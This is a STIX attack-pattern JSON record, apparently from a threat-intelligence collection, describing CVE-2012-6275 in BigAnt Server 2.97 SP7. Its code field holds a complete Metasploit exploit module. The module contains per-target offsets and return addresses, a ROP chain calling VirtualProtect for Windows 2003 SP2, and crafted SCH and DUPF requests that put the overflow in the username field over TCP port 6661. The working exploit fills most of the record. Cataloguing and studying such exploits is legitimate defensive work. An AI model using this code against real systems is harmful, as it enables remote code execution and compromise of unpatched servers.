{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c456eab0-6bd0-4e90-ac8a-48e59ef9ccec",
    "created": "2024-08-14T16:47:18.391687Z",
    "modified": "2024-08-14T16:47:18.391691Z",
    "name": "BigAnt Server 2 SCH And DUPF Buffer Overflow",
    "description": " This exploits a stack buffer overflow in BigAnt Server 2.97 SP7. The vulnerability is due to the dangerous usage of strcpy while handling errors. This module uses a combination of SCH and DUPF request to trigger the vulnerability, and has been tested successfully against version 2.97 SP7 over Windows XP SP3 and Windows 2003 SP2. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/bigant_server_sch_dupf_bof.rb",
            "external_id": "bigant_server_sch_dupf_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6275"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BigAnt Server 2 SCH And DUPF Buffer Overflow',\n      'Description'    => %q{\n          This exploits a stack buffer overflow in BigAnt Server 2.97 SP7. The\n        vulnerability is due to the dangerous usage of strcpy while handling errors. This\n        module uses a combination of SCH and DUPF request to trigger the vulnerability, and\n        has been tested successfully against version 2.97 SP7 over Windows XP SP3 and\n        Windows 2003 SP2.\n      },\n      'Author'         =>\n        [\n          'Hamburgers Maccoy', # Vulnerability discovery\n          'juan vazquez'       # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-6275' ],\n          [ 'US-CERT-VU', '990652' ],\n          [ 'BID', '57214' ],\n          [ 'OSVDB', '89344' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2500,\n          'BadChars'    => \"\\x00\\x0a\\x0d\\x25\\x27\",\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'BigAnt Server 2.97 SP7 / Windows XP SP3',\n            {\n              'Offset'     => 629,\n              'Ret'        => 0x77c21ef4, # ppr from msvcrt\n              'JmpESP'     => 0x77c35459, # push esp # ret from msvcrt\n              'FakeObject' => 0x77C60410 # .data from msvcrt\n            }\n          ],\n          [ 'BigAnt Server 2.97 SP7 / Windows 2003 SP2',\n            {\n              'Offset'      => 629,\n              'Ret'         => 0x77bb287a, # ppr from msvcrt\n              'FakeObject'  => 0x77bf2460, # .data from msvcrt\n              :callback_rop => :w2003_sp2_rop\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2013-01-09'))\n\n      register_options([Opt::RPORT(6661)])\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\")[0].to_i\n  end\n\n  def nop\n    return make_nops(4).unpack(\"V\")[0].to_i\n  end\n\n  def w2003_sp2_rop\n    rop_gadgets =\n      [\n        0x77bc5d88, # POP EAX # RETN\n        0x77ba1114, # <- *&VirtualProtect()\n        0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN\n        junk,\n        0x77bb0c86, # XCHG EAX,ESI # RETN\n        0x77bc9801, # POP EBP # RETN\n        0x77be2265, # ptr to 'push esp #  ret'\n        0x77bc5d88, # POP EAX # RETN\n        0x03C0990F,\n        0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0x500 -> ebx)\n        0x77bb48d3, # POP EBX, RET\n        0x77bf21e0, # .data\n        0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN\n        0x77bbfc02, # POP ECX # RETN\n        0x77bef001, # W pointer (lpOldProtect) (-> ecx)\n        0x77bd8c04, # POP EDI # RETN\n        0x77bd8c05, # ROP NOP (-> edi)\n        0x77bc5d88, # POP EAX # RETN\n        0x03c0984f,\n        0x77bdd441, # SUB EAX, 03c0940f\n        0x77bb8285, # XCHG EAX,EDX # RETN\n        0x77bc5d88, # POP EAX # RETN\n        nop,\n        0x77be6591, # PUSHAD # ADD AL,0EF # RETN\n      ].pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n  def exploit\n\n    sploit = rand_text_alpha(target['Offset'])\n    sploit << [target.ret].pack(\"V\")\n    sploit << [target['FakeObject']].pack(\"V\")\n    sploit << [target['FakeObject']].pack(\"V\")\n    if target[:callback_rop] and self.respond_to?(target[:callback_rop], true)\n      sploit << self.send(target[:callback_rop])\n    else\n      sploit << [target['JmpESP']].pack(\"V\")\n    end\n    sploit << payload.encoded\n\n    random_filename = rand_text_alpha(4)\n    random_date = \"#{rand_text_numeric(4)}-#{rand_text_numeric(2)}-#{rand_text_numeric(2)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)}\"\n    random_userid = rand_text_numeric(1)\n    random_username = rand_text_alpha_lower(5)\n    random_content = rand_text_alpha(10 + rand(10))\n\n    sch = \"SCH 16\\n\"\n    sch << \"cmdid: 1\\n\"\n    sch << \"content-length: 0\\n\"\n    sch << \"content-type: Appliction/Download\\n\"\n    sch << \"filename: #{random_filename}.txt\\n\"\n    sch << \"modified: #{random_date}\\n\"\n    sch << \"pclassid: 102\\n\"\n    sch << \"pobjid: 1\\n\"\n    sch << \"rootid: 1\\n\"\n    sch << \"sendcheck: 1\\n\"\n    sch << \"source_cmdname: DUPF\\n\"\n    sch << \"source_content-length: 116619\\n\"\n    sch << \"userid: #{random_userid}\\n\"\n    sch << \"username: #{sploit}\\n\\n\"\n\n    print_status(\"Trying target #{target.name}...\")\n\n    connect\n    print_status(\"Sending SCH request...\")\n    sock.put(sch)\n    res = sock.get_once\n    if res.nil?\n      fail_with(Failure::Unknown, \"No response to the SCH request\")\n    end\n    if res=~ /scmderid: \\{(.*)\\}/\n      scmderid = $1\n    else\n      fail_with(Failure::UnexpectedReply, \"scmderid value not found in the SCH response\")\n    end\n\n    dupf = \"DUPF 16\\n\"\n    dupf << \"cmdid: 1\\n\"\n    dupf << \"content-length: #{random_content.length}\\n\"\n    dupf << \"content-type: Appliction/Download\\n\"\n    dupf << \"filename: #{random_filename}.txt\\n\"\n    dupf << \"modified: #{random_date}\\n\"\n    dupf << \"pclassid: 102\\n\"\n    dupf << \"pobjid: 1\\n\"\n    dupf << \"rootid: 1\\n\"\n    dupf << \"scmderid: {#{scmderid}}\\n\"\n    dupf << \"sendcheck: 1\\n\"\n    dupf << \"userid: #{random_userid}\\n\"\n    dupf << \"username: #{random_username}\\n\\n\"\n    dupf << random_content\n\n    print_status(\"Sending DUPF request...\")\n    sock.put(dupf)\n    #sock.get_once\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-09",
    "x_mitre_platforms": [
        "win'"
    ]
}